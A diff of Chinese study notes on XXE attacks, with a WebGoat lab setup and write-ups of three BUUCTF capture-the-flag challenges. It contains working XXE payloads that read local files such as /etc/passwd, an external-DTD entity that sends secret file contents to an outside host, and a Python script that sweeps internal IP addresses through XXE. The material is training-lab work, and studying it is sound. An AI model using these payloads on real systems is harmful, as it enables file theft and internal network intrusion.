@@ -1,4 +1,5 @@
-# WebGoat 搭建  
+# 环境
+## WebGoat 搭建  
 1. 
 安装docker,使用以下命令  
 ```bash
@@ -23,7 +24,7 @@ git clone https://github.com/WebGoat/WebGoat.git
 ~/.m2/repository/org/eclipse/jgit/org.eclipse.jgit
 cd ~/.m2/repository/org/apache/pdfbox/pdfbox/2.0.24  
 
-# php和Apache httpd  
+## php和Apache httpd  
 httpd下载连接  
 ```
 https://www.apachelounge.com/download/ 
@@ -123,7 +124,7 @@ XML实体在DTD中被声明，用于代替内容或标记。
 但是返回结果并不是想要的内容，这是因为服务端检查到特殊的内容后，会将原本预期的内容修改  
 ![alt text](image-12.png)  
 
-可以使用外带数据的方式实现xxe攻击  
+### 外带数据实现xxe攻击  
 
 外带数据一般是将目标内容作为get请求的参数添加到url路径后面，查看请求得到url，以本题为例  
 
@@ -165,6 +166,7 @@ fclose($file);
 查看test.txt,保存了目标内容  
 ![alt text](image-13.png)  
 
+
 1. 在外部DTD中，send实体嵌套定义在int实体中，这是为了将后面的%secret;展开，如果不嵌套，而是直接用下面方式定义  
 ```xml
 <!ENTITY % send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>
@@ -203,4 +205,120 @@ kk.txt
 <text>hello&send;</text>
 </comment>  
 ```  
+
+
+- 还有一个简单的绕过方法，构造请求体如下  
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE comment[
+<!ENTITY file SYSTEM "file:///home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt">
+]>
+<comment>  <text>aaaaa&file;</text></comment>
+```  
+![alt text](image-14.png)  
+因为服务端检验的逻辑是，首先判断请求体的原始数据有没有包含secret的内容，只要有就通过  
+如果没有就xml解析，展开实体，但是作者写成secret的内容是否包含了text标签的内容，所以随便加点就可以绕过
+关键代码如下，完整代码的位置在WebGoat\src\main\java\org\owasp\webgoat\lessons\xxe  
+```java  
+ if (commentStr.contains(fileContentsForUser)) {
+      return success(this).build();
+    }
+    /*
+     * commentStr是请求体的原始数据，是xml格式的数据，是String类，如果包含secret的内容，就正确
+     * fileContentsForUser是为用户生成的secret内容
+     */
+
+    try {
+      /*
+       * comments是一个CommentsCache类,管理评论区的内容
+       * false表示不启用安全模式，运行使用外部实体
+       * comments解析请求体返回一个Comment类
+       * 如果解析后的内容属于secret的一部分，就修改请求
+       * 
+       */
+      Comment comment = comments.parseXml(commentStr, false);
+      if (fileContentsForUser.contains(comment.getText())) {
+        comment.setText("Nice try, you need to send the file to WebWolf");
+      }
+      comments.addComment(comment, user, false);
+    } catch (Exception e) {
+      return failed(this).output(e.toString()).build();
+    }
+```
+
+
+# 几个XXE题目  
+
+## BUUCTF Fake XML cookbook  
+
+![alt text](image-13.png)  
+
+提交后发现用户名出现在msg标签中  
+![alt text](image-14.png)  
+![alt text](image-15.png) 
+抓包发现使用xml格式，构造请求体  
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE user[
+<!ENTITY root SYSTEM "file:///flag">
+]>
+<user>
+<username>&root;</username>
+<password>ddd</password>
+</user>
+```  
+
+
+## BUUCTF True XML cookbook  
+
+![alt text](image-17.png)  
+一模一样，同样的方式xxe攻击，但是没有显示结果，可能是攻击失败，也可能没有这个文件  
+
+访问其他文件，比如/etc/passwd,返回结果，说明攻击成功，不存在flag文件  
+![alt text](image-18.png)  
+
+内网渗透找/proc/net/fib_trie  
+```xml  
+<?xml version="1.0"?>
+<!DOCTYPE user[
+<!ENTITY root SYSTEM "file:///flag">
+]>
+<user><username>adsg</username><password>asdg</password></user>
+```
+![alt text](image-19.png)  
+爆破ip最后一位  
+![alt text](image-20.png)  
+不过出问题了，要设置timeout，不然就需要很久，使用一个简单的脚本  
+```py
+import requests
+url="http://49242b9d-993f-405e-aff0-2d19a551a4ba.node5.buuoj.cn:81/doLogin.php"
+for i in range(1,256):
+    payload=f'<?xml version="1.0"?><!DOCTYPE user[<!ENTITY root SYSTEM "http://10.244.166.{i}">]><user><username>&root;</username><password>ddd</password></user>'
+    try:
+        res=requests.post(url=url,data=payload,timeout=1)
+        print(res.text,end="\n")
+    except:
+        continue
+```  
+重定向，然后搜索flag  
+![alt text](image-21.png)  
+![alt text](image-22.png)  
+
+
+## BUUCTF XXE COURSE 1  
+一个登录界面，输入提交之后有回显，抓包发现是用xml格式发送数据  
+找文件直接找flag，找到了就很好  
+![alt text](image-4.png)  
+![alt text](image-23.png)  
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root[
+<!ENTITY f SYSTEM "file:///flag">
+]>
+<root> <username>&f;</username> <password>asdg</password> </root>
+```  
+可以找到  
+![alt text](image-24.png)  
 
